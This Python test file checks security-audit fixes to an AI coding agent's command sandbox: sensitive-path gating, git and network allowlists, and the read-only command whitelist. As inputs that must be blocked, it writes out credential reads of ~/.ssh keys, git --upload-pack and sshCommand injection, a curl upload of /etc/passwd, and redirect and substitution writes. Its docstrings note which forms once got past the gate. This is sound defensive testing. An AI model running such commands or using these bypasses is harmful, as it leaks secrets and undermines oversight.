"""codex 安全沙箱审计 7 项修复的回归测试（2026-09-12）。

覆盖：
- P0-1: SensitivePathGate 复合命令绕过（test -f x && cat x）
- P0-2: bash_lingxi 正则写坏（handler 级敏感路径拦截）
- P0-3: bwrap 探测统一 + BashResult.degraded 显式化
- P0-4: 网络白名单参数级校验（git push --upload-pack=evil 注入）
- P1-1: bash 超时 killpg 整组（start_new_session）
- P1-2: post-write 失败自动回滚（rollback_callback）
- P1-3: MCP 假可用（stdio binary which 检查）
- P0-5: bash 只读白名单高危副作用命令移除 + curl/wget 二级参数判定
"""

from __future__ import annotations

import os
import subprocess
import sys
import time
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))


# ---------- P0-1: SensitivePathGate 复合命令绕过 ----------

def test_p01_compound_cmd_blocked():
    """test -f x && cat x 复合命令读敏感路径 → 必须拦截（原为放行）。"""
    from lingclaude.engine.sensitive_path_gate import check_sensitive_path

    p = "~/.ssh/config"
    is_sensitive, _ = check_sensitive_path(p, command=f"test -f {p} && cat {p}")
    assert is_sensitive, "test && cat 复合命令应拦截"


def test_p01_bracket_base64_blocked():
    """[ -f x ] && base64 x 复合命令读敏感路径 → 必须拦截。"""
    from lingclaude.engine.sensitive_path_gate import check_sensitive_path

    p = "~/.ssh/id_ed25519"
    is_sensitive, _ = check_sensitive_path(p, command=f"[ -f {p} ] && base64 {p}")
    assert is_sensitive


def test_p01_metadata_still_allowed():
    """纯 metadata（test -f / ls）仍放行，不误伤。"""
    from lingclaude.engine.sensitive_path_gate import check_sensitive_path

    p = "~/.ssh/config"
    is_sensitive, _ = check_sensitive_path(p, command=f"test -f {p}")
    assert not is_sensitive


def test_p01_plain_cat_blocked():
    """plain cat 敏感路径仍拦截。"""
    from lingclaude.engine.sensitive_path_gate import check_sensitive_path

    p = "~/.ssh/config"
    is_sensitive, _ = check_sensitive_path(p, command=f"cat {p}")
    assert is_sensitive


def test_p01_pipeline_cat_blocked():
    """cat x | head 管道内 cat 仍拦截。"""
    from lingclaude.engine.sensitive_path_gate import check_sensitive_path

    p = "~/.ssh/config"
    is_sensitive, _ = check_sensitive_path(p, command=f"cat {p} | head")
    assert is_sensitive


def test_p01_no_command_fail_closed():
    """无 command 上下文 → fail-closed 拦截。"""
    from lingclaude.engine.sensitive_path_gate import check_sensitive_path

    is_sensitive, _ = check_sensitive_path("~/.ssh/config")
    assert is_sensitive


# ---------- P0-2: bash_lingxi 正则修复 ----------

def test_p02_bash_lingxi_regex_same_as_bash():
    """两 handler 的正则必须同源（同 _PATH_TOKEN_RE）。"""
    from lingclaude.engine.tool_handlers.bash_tools import _PATH_TOKEN_RE
    import re

    cmd = "cat ~/.ssh/config"
    matches = re.findall(_PATH_TOKEN_RE, cmd)
    assert matches == ["~/.ssh/config"], f"路径提取失败: {matches}"


def test_p02_common_check_blocks_ssh():
    """_check_sensitive_in_command 对 ssh config 返回拦截。"""
    from lingclaude.engine.tool_handlers.bash_tools import _check_sensitive_in_command

    blocked, reason = _check_sensitive_in_command("cat ~/.ssh/config")
    assert blocked is not None
    assert "ssh" in reason or "敏感" in reason


def test_p02_common_check_allows_safe():
    """_check_sensitive_in_command 对安全命令返回 (None, None)。"""
    from lingclaude.engine.tool_handlers.bash_tools import _check_sensitive_in_command

    blocked, reason = _check_sensitive_in_command("ls /home/ai/lingclaude")
    assert blocked is None and reason is None


# ---------- P0-3: bwrap 探测统一 + degraded 显式化 ----------

def test_p03_bash_result_degraded_field():
    """BashResult 支持 degraded 字段（默认 False）。"""
    from lingclaude.engine.bash import BashResult

    r = BashResult(exit_code=0, stdout="", stderr="", duration=0.1, command="echo hi")
    assert r.degraded is False


def test_p03_bash_probe_delegates_sandbox_provider():
    """bash.py 的 _bwrap_probe 委托 sandbox_provider（带 --unshare-net 探测）。"""
    from lingclaude.engine.bash import _bwrap_probe
    import lingclaude.engine.sandbox_provider as sp

    # bash.py 的探测结果应与 sandbox_provider 的探测一致（同一缓存源）
    result_bash = _bwrap_probe("bwrap")
    ok_sp, _ = sp._bwrap_probe("bwrap")
    assert result_bash == ok_sp


# ---------- P0-4: 网络白名单参数级校验 ----------

@pytest.mark.parametrize(
    "cmd,expected",
    [
        ("git push origin master", True),
        ("git push --upload-pack=evil origin master", False),
        ("git -c core.sshCommand=evil push origin master", False),
        ("git push origin master && wget evil.sh", False),
        ("git push 2>&1 | head", True),
        ("timeout 15 git push origin master", True),
        ("git push", True),
        ("git push github master", True),
        ("git push badremote master", False),
        # P0-②（灵安审计）：git 家族整体放行网络，本地只读子命令（log/status/diff）
        # 不再被 --unshare-net 隔离（它们本就不联网，放行无害且语义正确）。
        ("git log", True),
    ],
)
def test_p04_network_allowlist(cmd: str, expected: bool):
    from lingclaude.engine.bash import _is_network_allowed

    assert _is_network_allowed(cmd) is expected


def test_p04_git_network_safe_dangerous_params():
    from lingclaude.engine.bash import _git_network_safe

    assert not _git_network_safe("git push --upload-pack=evil origin master")
    assert not _git_network_safe("git -c core.sshCommand=evil push origin master")
    assert not _git_network_safe("git fetch --exec=evil origin")
    assert _git_network_safe("git push origin master")


# ---------- P1-1: bash 超时 killpg（进程组） ----------

def test_p11_bash_timeout_kills_process_group():
    """bash 超时后子进程被杀（用 sleep 验证不残留）。"""
    from lingclaude.engine.bash import BashExecutor

    ex = BashExecutor(timeout=2)
    result = ex.run("sleep 30")
    assert result.exit_code == 124
    # 确认 sleep 进程不残留（新会话组被 killpg）
    time.sleep(0.3)
    # 检查是否有残留的 sleep 30（当前用户）
    try:
        ps = subprocess.run(
            ["pgrep", "-f", "sleep 30"], capture_output=True, text=True, timeout=3
        )
        assert ps.returncode != 0, f"残留 sleep 进程: {ps.stdout}"
    except subprocess.TimeoutExpired:
        pass  # pgrep 超时不算失败


def test_p11_bash_result_timeout_message():
    """超时 stderr 提示进程组已终止。"""
    from lingclaude.engine.bash import BashExecutor

    ex = BashExecutor(timeout=1)
    result = ex.run("sleep 10")
    assert "超时" in result.stderr


# ---------- P1-2: post-write 失败自动回滚 ----------

def test_p12_auto_rollback_method_exists():
    """CodingRuntime 有 _auto_rollback_write 方法。"""
    from lingclaude.engine.coding import CodingRuntime

    assert hasattr(CodingRuntime, "_auto_rollback_write")


def test_p12_pipeline_accepts_rollback_callback():
    """ToolPipeline.execute 接受 rollback_callback 参数。"""
    from lingclaude.engine.tool_pipeline import ToolPipeline

    # 构造最小 pipeline 验证签名
    import inspect

    sig = inspect.signature(ToolPipeline.execute)
    assert "rollback_callback" in sig.parameters


# ---------- P1-3: MCP 假可用 ----------

def test_p13_register_stdio_missing_binary_unavailable():
    """stdio server 二进制不在 PATH → status=unavailable。"""
    from lingclaude.engine import mcp_proxy

    # 用不存在的二进制注册
    mcp_proxy.register_server(
        "test_missing_bin",
        "missing",
        "test",
        ("tool_x",),
        transport="stdio",
        command=("definitely_not_exist_binary_xyz", "--flag"),
    )
    info = mcp_proxy.find_server("tool_x")
    assert info is not None
    assert info.status == "unavailable"
    assert "not found" in (info.status_reason or "")


def test_p13_list_all_tools_skips_unavailable():
    """unavailable server 的工具不暴露。"""
    from lingclaude.engine import mcp_proxy

    tools = mcp_proxy.list_all_tools()
    assert "tool_x" not in tools


def test_p13_call_tool_rejects_unavailable():
    """调用 unavailable server 的工具 → SERVER_UNAVAILABLE。"""
    from lingclaude.engine import mcp_proxy

    res = mcp_proxy.call_tool("tool_x")
    assert res.is_error
    assert "unavailable" in str(res.error).lower()


def test_p13_register_module_transport_ok():
    """module transport 不检查二进制（进程内）。"""
    from lingclaude.engine import mcp_proxy

    mcp_proxy.register_server(
        "test_module_ok",
        "module",
        "test",
        ("tool_y",),
        transport="module",
    )
    info = mcp_proxy.find_server("tool_y")
    assert info is not None
    assert info.status == "available"


# --- 2026-09-13: extra_writable_dirs 能力分级修复 ---

def test_extra_writable_dirs_injected_in_bwrap():
    """BwrapSandboxProvider.wrap(extra_writable_dirs=...) 应注入 --bind 放开写。"""
    import shlex
    from lingclaude.engine import sandbox_provider as sp

    orig = sp.BwrapSandboxProvider.available
    sp.BwrapSandboxProvider.available = lambda self: True
    try:
        p = sp.BwrapSandboxProvider()
        p._bwrap = "/usr/bin/bwrap"
        cmd = p.wrap(
            "echo hi",
            working_dir=Path("/home/ai/lingclaude"),
            extra_writable_dirs=["/home/ai/lingcode"],
        )
    finally:
        sp.BwrapSandboxProvider.available = orig
    parts = shlex.split(cmd)
    binds = [
        (parts[i], parts[i + 1], parts[i + 2])
        for i in range(len(parts) - 2)
        if parts[i] in ("--bind", "--ro-bind", "--dev-bind")
    ]
    assert ("--bind", "/home/ai/lingcode", "/home/ai/lingcode") in binds, "额外可写目录未注入"
    assert ("--bind", "/home/ai/lingclaude", "/home/ai/lingclaude") in binds, "wd 可写绑定丢失"
    assert ("--bind", "/tmp", "/tmp") in binds, "/tmp 可写绑定丢失"


def test_extra_writable_dirs_dedup_wd_and_tmp():
    """extra_writable_dirs 中与 wd//tmp 重复的目录不应重复 bind。"""
    import shlex
    from lingclaude.engine import sandbox_provider as sp

    orig = sp.BwrapSandboxProvider.available
    sp.BwrapSandboxProvider.available = lambda self: True
    try:
        p = sp.BwrapSandboxProvider()
        p._bwrap = "/usr/bin/bwrap"
        cmd = p.wrap(
            "echo hi",
            working_dir=Path("/home/ai/lingclaude"),
            extra_writable_dirs=["/home/ai/lingclaude", "/tmp", "/home/ai/lingcode"],
        )
    finally:
        sp.BwrapSandboxProvider.available = orig
    parts = shlex.split(cmd)
    assert parts.count("/home/ai/lingcode") == 2  # ro-bind / 内隐含 + 自身 bind
    assert parts.count("/home/ai/lingclaude") == 2  # 不重复
    assert parts.count("/tmp") == 2  # ro-bind / 内隐含 + 自身 bind


def test_bash_extra_writable_dirs_from_env():
    """bash.py 应从 LINGCLAUDE_EXTRA_WRITABLE_DIRS 读取额外可写目录并传给 wrap。"""
    import os
    from unittest.mock import patch
    from lingclaude.engine.bash import BashExecutor

    captured = {}

    class FakeProvider:
        def available(self):
            return True

        def wrap(self, command, working_dir=None, allow_network=False, extra_writable_dirs=None):
            captured["extra"] = extra_writable_dirs
            return command

    b = BashExecutor()
    b._sandbox_provider = FakeProvider()
    with patch.dict(os.environ, {"LINGCLAUDE_EXTRA_WRITABLE_DIRS": "/home/ai/lingcode,/tmp"}):
        b._sandbox_command("echo hi")
    assert captured["extra"] == ["/home/ai/lingcode", "/tmp"], f"got {captured.get('extra')}"

    captured.clear()
    with patch.dict(os.environ, {}, clear=False):
        os.environ.pop("LINGCLAUDE_EXTRA_WRITABLE_DIRS", None)
        b._sandbox_command("echo hi")
    # B1 (2026-09-13): 未显式设置时默认对齐策略层 allowed_paths —— /home/ai 可写。
    # 显式设置仍全量尊重用户指定（上方断言）。此断言从 None 改为默认目录。
    assert captured["extra"] == ["/home/ai"], f"未设置时应默认 /home/ai，got {captured.get('extra')}"


# ---------- P0-5: bash 只读白名单高危副作用命令移除 + curl/wget 二级参数判定 ----------

def test_p05_high_risk_cmds_removed_from_readonly_whitelist():
    """高危副作用命令（可写/可执行任意代码）必须移出只读白名单 → 整体非只读。"""
    from lingclaude.engine.sensitive_path_gate import (
        BASH_READONLY_LEADS,
        is_readonly_bash_command,
    )

    for cmd in ["tee", "systemctl", "python", "python3", "node",
                "npm", "pip", "pip3", "make", "pytest"]:
        assert cmd not in BASH_READONLY_LEADS, f"{cmd} 不应在只读白名单中"

    # 即使"看起来只读"的解释器形态也要拦（无法静态证明无副作用）
    for cmd in ['python3 -c "print(1)"', "node -e 'console.log(1)'",
                "tee /tmp/x", "systemctl status", "make -n"]:
        assert not is_readonly_bash_command(cmd), f"应拦截: {cmd}"


def test_p05_curl_write_forms_blocked():
    """curl 写文件/发数据/自定义方法 → 非只读，必须拦截。"""
    from lingclaude.engine.sensitive_path_gate import is_readonly_bash_command

    for cmd in [
        "curl -o /tmp/x http://example.com",       # 写文件
        "curl -O http://example.com/x",             # 写文件（远程名）
        "curl -d 'a=1' http://example.com",         # POST 数据
        "curl -X POST http://example.com",          # 自定义方法
        "curl -F 'file=@/etc/passwd' http://x",     # 上传
        "curl http://example.com",                   # 默认 GET 输出内容
        "curl -sS http://example.com",               # 静默 GET 仍输出内容
    ]:
        assert not is_readonly_bash_command(cmd), f"应拦截: {cmd}"


def test_p05_curl_query_forms_allowed():
    """curl 纯查询形态（HEAD/版本/帮助/丢弃输出）→ 放行。"""
    from lingclaude.engine.sensitive_path_gate import is_readonly_bash_command

    for cmd in [
        "curl -I http://example.com",                # HEAD 仅头
        "curl --head http://example.com",
        "curl -sI http://example.com",               # 静默 HEAD
        "curl -V",                                   # 版本
        "curl -o /dev/null -sI http://example.com",  # 丢弃输出 + HEAD
    ]:
        assert is_readonly_bash_command(cmd), f"应放行: {cmd}"


def test_p05_wget_forms():
    """wget 仅 --spider/版本/帮助放行；下载/日志写盘拦截。"""
    from lingclaude.engine.sensitive_path_gate import is_readonly_bash_command

    assert is_readonly_bash_command("wget --spider http://example.com")
    assert is_readonly_bash_command("wget -V")
    assert not is_readonly_bash_command("wget http://example.com/x")          # 默认下载写盘
    assert not is_readonly_bash_command("wget -O /tmp/x http://example.com")  # 显式写文件
    assert not is_readonly_bash_command("wget -o /tmp/log http://example.com")  # 日志写盘


def test_p05_safe_readonly_commands_still_allowed():
    """常规只读命令（ls/git status/ps）不受影响。"""
    from lingclaude.engine.sensitive_path_gate import is_readonly_bash_command

    for cmd in [
        "ls -la",
        "git status",
        "git -C /tmp status --short",
        "ps aux",
        "cat README.md | head -5",
        "echo hello",
        "pwd && ls",
    ]:
        assert is_readonly_bash_command(cmd), f"应放行: {cmd}"


def test_p05_git_side_effect_subcmd_still_blocked():
    """git 二级白名单保留：push/clean 等副作用子命令仍拦。"""
    from lingclaude.engine.sensitive_path_gate import is_readonly_bash_command

    assert not is_readonly_bash_command("git push origin main")
    assert not is_readonly_bash_command("git clean -fd")
    assert not is_readonly_bash_command("git reset --hard")


# ── 2026-09-18 P0: 只读动词+写向重定向绕过修复（_has_unsafe_redirect）──


def test_redirect_write_via_readonly_verb_blocked():
    """「只读动词 + 输出重定向」= 写盘，必须拦（修复前 cat x > /tmp/y 被放行）。"""
    from lingclaude.engine.sensitive_path_gate import is_readonly_bash_command

    for cmd in [
        "echo pwned > /tmp/attack_test_file",
        "cat /etc/passwd > /tmp/attack_test_file",
        "echo hi >> /tmp/attack_test_file",
        "ls > out.txt",
        "git log &> /tmp/log.txt",
        "echo 1 && echo 2 > /tmp/x",
    ]:
        assert not is_readonly_bash_command(cmd), f"重定向写盘应拦: {cmd}"


def test_command_and_process_substitution_blocked():
    """命令替换 $(...)/反引号与进程替换 <(...) 可执行任意代码 → fail-closed。"""
    from lingclaude.engine.sensitive_path_gate import is_readonly_bash_command

    for cmd in [
        "echo $(whoami)",
        "echo `whoami`",
        "diff <(ls a) <(ls b)",
    ]:
        assert not is_readonly_bash_command(cmd), f"替换执行应拦: {cmd}"


def test_harmless_fd_redirects_still_allowed():
    """fd→fd 重定向与 /dev/null 丢弃不误伤；引号内 > 是文本非重定向。"""
    from lingclaude.engine.sensitive_path_gate import is_readonly_bash_command

    for cmd in [
        "git log 2>&1 | head -3",
        "grep -rn x . 2>/dev/null",
        "ls > /dev/null",
        "cat file 2>/dev/null 1>&2",
        "echo 'a > b is comparison'",
        'echo "path: a>b"',
    ]:
        assert is_readonly_bash_command(cmd), f"无害重定向应放行: {cmd}"


def test_jq_readonly_whitelisted():
    """jq 纯 stdout 文本处理无写盘副作用（写盘由重定向检测拦）→ 放行。"""
    from lingclaude.engine.sensitive_path_gate import is_readonly_bash_command

    assert is_readonly_bash_command("jq . data.json")
    assert is_readonly_bash_command("jq . data.json | head -5")
